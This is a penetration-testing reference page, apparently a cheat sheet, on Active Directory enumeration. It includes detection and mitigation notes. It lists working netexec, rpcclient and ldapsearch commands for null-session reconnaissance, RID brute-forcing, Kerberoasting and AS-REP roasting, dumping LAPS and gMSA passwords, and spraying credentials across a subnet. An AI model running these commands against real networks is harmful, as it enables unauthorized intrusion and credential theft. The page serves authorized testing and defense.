---
title: Enumeration
category: AD / Recon
order: 10
tags: [recon, enum, netexec, ldap, smb, rpc, null-session]
summary: >
  Map the domain before and after getting credentials: hosts, users, groups,
  shares, policies, delegation and low-hanging fruit. netexec (nxc) + ldap are
  the workhorses.
tools: [netexec, impacket, ldapsearch, rpcclient, enum4linux-ng, windapsearch]
detection:
  - Bulk LDAP queries, SAMR/RID enumeration, many SMB session setups from one host
  - Event 4661/4662 (object access), 5145 (share access)
mitigation:
  - Restrict anonymous access (RestrictAnonymous, RestrictNullSessAccess)
  - Enable LDAP signing + channel binding; monitor recon tooling signatures
refs:
  - { label: "netexec wiki", url: "https://www.netexec.wiki/" }
  - { label: "HackTricks — AD enumeration", url: "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" }
---

## Unauthenticated

Find the DCs and see what answers without creds.

```sh
# host + protocol sweep (signing tells you where you can relay)
netexec smb $ip/24
netexec ldap $dc_ip
# null / guest session — shares, users, password policy
netexec smb $dc_ip -u '' -p '' --shares --users --pass-pol
netexec smb $dc_ip -u guest -p '' --rid-brute 10000
```

```sh
# RPC null session
rpcclient -U '' -N $dc_ip -c 'enumdomusers;enumdomgroups;querydominfo'
# LDAP anonymous — naming contexts, sometimes objects
ldapsearch -x -H ldap://$dc_ip -s base namingcontexts
```

## Authenticated

Once you hold `$user` / `$password` (or `-H $nthash`), enumerate broadly.

```sh
# users, groups, computers, policy, delegation, loggedon
netexec smb $dc_ip -u $user -p $password --users --groups --computers
netexec ldap $dc_ip -u $user -p $password --pass-pol --trusted-for-delegation
# spot low-hanging fruit
netexec ldap $dc_ip -u $user -p $password --asreproast asrep.txt
netexec ldap $dc_ip -u $user -p $password --kerberoasting kerb.txt
```

```sh
# passwords in user description / attributes, gMSA, LAPS
netexec ldap $dc_ip -u $user -p $password -M get-desc-users
netexec ldap $dc_ip -u $user -p $password --gmsa
netexec ldap $dc_ip -u $user -p $password -M laps
```

```sh
# find where YOU are local admin (spray your creds across the subnet)
netexec smb $ip/24 -u $user -p $password
# lines flagged (Pwn3d!) = local admin there
```

> Feed everything into BloodHound (next page) to see the actual paths instead of
> reading raw dumps.
